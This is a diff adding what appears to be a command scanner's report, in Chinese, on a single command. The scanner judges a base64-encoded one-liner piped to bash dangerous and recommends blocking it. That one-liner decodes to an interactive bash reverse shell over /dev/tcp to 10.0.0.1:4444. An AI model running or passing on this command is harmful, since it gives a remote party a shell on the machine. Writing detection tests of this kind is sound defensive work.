@@ -1,0 +1,14 @@
+🚨 判定: DANGEROUS (风险分: 100/100, 置信度: HIGH)
+命令: echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash
+
+发现 4 个问题 (3 严重, 1 警告):
+  [CRITICAL] 静态分析: 命令匹配恶意模式: base64 decode piped to shell [T1059.004]
+  [CRITICAL] 静态分析: 命令匹配恶意模式: reverse shell via /dev/tcp [T1059.004]
+  [CRITICAL] 静态分析: 命令匹配恶意模式: interactive bash reverse shell [T1059.004]
+  [WARN] 去混淆: 命令包含 base64 编码层 [T1140]
+
+涉及 ATT&CK 战术: Defense Evasion, Execution
+
+建议:
+  • BLOCK: 强烈建议阻止此命令执行
+  • 检查网络连接: ss -tunap | grep ESTABLISHED
